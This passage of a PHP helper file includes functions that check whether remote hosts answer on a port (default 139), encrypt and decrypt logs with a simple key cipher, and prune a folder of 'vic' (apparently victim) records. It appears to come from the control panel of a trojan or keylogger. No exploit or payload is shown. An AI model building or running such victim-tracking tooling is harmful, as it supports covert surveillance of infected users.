	   else
	       {
		   	if(stristr($array_name[$i],"port"))
	           {
	            $port=($array_val[$i]);
	            $j++;
	           }
		   }
	}
if($j>0)
   {
   return $port;
   } 
   else
       {
	   return "139";
	   }  
}
######################################################################################
function ping_host2($ip,$port){

	if(is_numeric($port))
	   {
	   if($ping=fsockopen($ip,$port,&$errno,&$errstr,1))
	      {
		  return true;
		  }
		  else
		      {
			  return false;
			  }
	   }
}
######################################################################################
function add_zero($od){

if($od<10)
   {
   $result="0".$od;
   intval($result);
   echo$result;
   }
   else
       {
	   $result=$od;
       echo$result;
	   }
return $result;	   
}
######################################################################################
function decrypt_log($log,$key,$crypted){ 
   
   $result="";
    if($crypted==1) 
	    {
        $x=0; 
        for ($i=0;$i<strlen($log);$i++) 
             { 
             if($x>=strlen($key)) 
                $x=0; 
                $result.=Chr(Ord($log[$i])-Ord($key[$x])); 
             $x++; 
             } 
		return $result; 
		echo("<li>".$result);
	    }
		else
		    {
			return $log;
			}		 
} 
######################################################################################
function encrypt_log($log,$key,$crypted){ 
   
   $result="";
    if($crypted==1) 
	    {
        $x=0; 
        for ($i=0;$i<strlen($log);$i++) 
             { 
             if($x>=strlen($key)) 
                $x=0; 
                $result.=Chr(Ord($log[$i])+Ord($key[$x])); 
             $x++; 
             } 
		return $result; 
	    }
		else
		    {
			return $log;
			}		 
} 
######################################################################################
function is_crypted($crypted){

if($crypted==1)
   {
   echo("yes");
   }
   else
       {
	   echo("none");
	   }
}
######################################################################################
function is_crypted2($crypted){

if($crypted==1)
   {
   return("yes");
   }
   else
       {
	   return("none");
	   }
}
######################################################################################
function redirect($url){ 
  die('<meta http-equiv="refresh" content="0;URL='.$url.'">'); 
}
######################################################################################
function delete_old_vic($vic_folder,$max_vic_time){

			  if(is_numeric($max_vic_time))
			     {
				 $limit_time=time()-($max_vic_time*86400);
				 
				 $vic_list=scan_dir($vic_folder);
				 if(is_array($vic_list))
			        {
			        rsort($vic_list);
				 
				    for($i=0;$i<count($vic_list);$i++)
					    {
					    if(substr(trim($vic_list[$i]),0,-4)<$limit_time)
					       {
						   if(is_file("./".$vic_folder."/".$vic_list[$i]))
						      {
							  unlink("./".$vic_folder."/".$vic_list[$i]);
							  }
						   }
				        }
					 }
				 unset($vic_list);
			     }
}
######################################################################################
function delete_exedent_vic($max_vic_list,$vic_folder){

			  if(is_numeric($max_vic_list))
			     {
				 $vic_list=scan_dir($vic_folder);
                 if(is_array($vic_list))
			        {
				     rsort($vic_list);
				    				 
				     if(count($vic_list)>$max_vic_list)
				        {
					    for($i=($max_vic_list);$i<count($vic_list);$i++)
					        {
							if(is_file("./".$vic_folder."/".$vic_list[$i]))
							   {
							   unlink("./".$vic_folder."/".$vic_list[$i]);
							   }
						    }
					    }
					}
				 unset($vic_list);
				 }
}
######################################################################################
function list_posted_array($array){ 

     FOR($i=0;$i<count($array);$i++)
	     {
		 $result[$i]=$array[$i];
		 }
		 return $result;
}
##########################################################################################################
function test_select($test_var,$tester){

    IF($test_var==$tester)
	   {
		echo("<option selected value=\"$tester\">enabled</option>
			  <option>disabled</option>");
	   }
	   else
		   {
		   echo("<option selected>disabled</option>
				 <option value=\"$tester\">enabled</option>");
		   }
}
##########################################################################################################
function test_select_step($init,$step,$end,$tester){

				   for($i=$init;$i<$end;$i=($i+$step))
				       {
					   if($i==$tester)
					      {
						  echo("<option selected>".($i)."</option>");
						  }
						  else
						      {
							  echo("<option>".($i)."</option>");
							  }
					   }
}
##########################################################################################################
?>